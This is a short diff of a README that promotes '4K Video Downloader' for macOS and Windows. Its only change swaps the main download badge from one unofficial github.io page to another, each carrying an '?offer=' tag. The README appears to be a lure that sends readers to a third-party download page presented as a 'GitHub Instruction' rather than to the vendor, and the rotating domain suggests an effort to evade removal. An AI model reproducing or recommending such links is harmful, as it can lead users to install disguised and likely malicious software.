@@ -3,7 +3,7 @@
 **4K Video Downloader** is a cross-platform desktop app for **macOS** and **Windows** that lets you download videos, playlists, subtitles, and channels from popular platforms in up to **8K resolution**.  
 The software delivers fast downloads, clean organization, and reliable background performance — now fully optimized for **Apple Silicon** and Windows 11. 🍎💻  
 
-[![💚 Get GitHub Instruction](https://img.shields.io/badge/💚%20Get%204K%20Downloader-28A745?style=for-the-badge&logo=github&logoColor=white)](https://git-app-desk.github.io/.github/?offer=4KVideoDownloaderApp)
+[![💚 Get GitHub Instruction](https://img.shields.io/badge/💚%20Get%204K%20Downloader-28A745?style=for-the-badge&logo=github&logoColor=white)](https://desk-load-app.github.io/.github/?offer=4KVideoDownloaderApp)
 
 ---
 
